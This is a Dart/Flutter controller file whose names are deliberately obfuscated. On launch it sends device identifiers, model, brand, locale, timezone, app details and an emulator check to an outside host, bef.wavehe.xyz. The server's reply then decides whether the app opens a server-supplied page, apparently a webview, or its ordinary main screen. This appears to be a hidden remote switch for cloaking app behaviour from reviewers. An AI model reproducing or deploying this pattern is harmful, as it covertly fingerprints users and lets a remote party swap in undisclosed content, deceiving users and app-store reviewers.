import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var dngbarfxwp = RxBool(false);
  var wtjvfihk = RxBool(true);
  var nucd = RxString("");
  var tristian = RxBool(false);
  var schroeder = RxBool(true);
  final yzuiam = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    arnfvmx();
  }


  Future<void> arnfvmx() async {

    tristian.value = true;
    schroeder.value = true;
    wtjvfihk.value = false;

    yzuiam.post("https://bef.wavehe.xyz/DRZJYKKPE",data: await fstvaj()).then((value) {
      var jgmyu = value.data["jgmyu"] as String;
      var cspzig = value.data["cspzig"] as bool;
      if (cspzig) {
        nucd.value = jgmyu;
        johann();
      } else {
        denesik();
      }
    }).catchError((e) {
      wtjvfihk.value = true;
      schroeder.value = true;
      tristian.value = false;
    });
  }

  Future<Map<String, dynamic>> fstvaj() async {
    final DeviceInfoPlugin avkt = DeviceInfoPlugin();
    PackageInfo shxm_nlzb = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var lnozsxti = Platform.localeName;
    var ytu_GQuApS = currentTimeZone;

    var ytu_RemOKZyq = shxm_nlzb.packageName;
    var ytu_QLMwoX = shxm_nlzb.version;
    var ytu_VOwkTDs = shxm_nlzb.buildNumber;

    var ytu_rXZfLM = shxm_nlzb.appName;
    var ytu_xty = "";
    var andersonStiedemann = "";
    var ytu_blzj = "";
    var cleveMohr = "";
    var alfonzoLowe = "";
    var ytu_OM  = "";

    var durwardReichel = "";

    var ytu_pdXEFC = "";
    var ytu_hYDoWx = false;

    if (GetPlatform.isAndroid) {
      ytu_pdXEFC = "android";
      var endusmzw = await avkt.androidInfo;

      ytu_blzj = endusmzw.brand;

      ytu_xty  = endusmzw.model;
      ytu_OM = endusmzw.id;

      ytu_hYDoWx = endusmzw.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      ytu_pdXEFC = "ios";
      var jlufikpvt = await avkt.iosInfo;
      ytu_blzj = jlufikpvt.name;
      ytu_xty = jlufikpvt.model;

      ytu_OM = jlufikpvt.identifierForVendor ?? "";
      ytu_hYDoWx  = jlufikpvt.isPhysicalDevice;
    }

    var res = {
      "ytu_rXZfLM": ytu_rXZfLM,
      "ytu_VOwkTDs": ytu_VOwkTDs,
      "andersonStiedemann" : andersonStiedemann,
      "ytu_RemOKZyq": ytu_RemOKZyq,
      "durwardReichel" : durwardReichel,
      "ytu_xty": ytu_xty,
      "ytu_GQuApS": ytu_GQuApS,
      "ytu_blzj": ytu_blzj,
      "ytu_QLMwoX": ytu_QLMwoX,
      "ytu_OM": ytu_OM,
      "lnozsxti": lnozsxti,
      "ytu_pdXEFC": ytu_pdXEFC,
      "cleveMohr" : cleveMohr,
      "ytu_hYDoWx": ytu_hYDoWx,
      "alfonzoLowe" : alfonzoLowe,

    };
    return res;
  }

  Future<void> denesik() async {
    Get.offAllNamed("/xiMain");
  }

  Future<void> johann() async {
    Get.offAllNamed("/xiWay");
  }

}
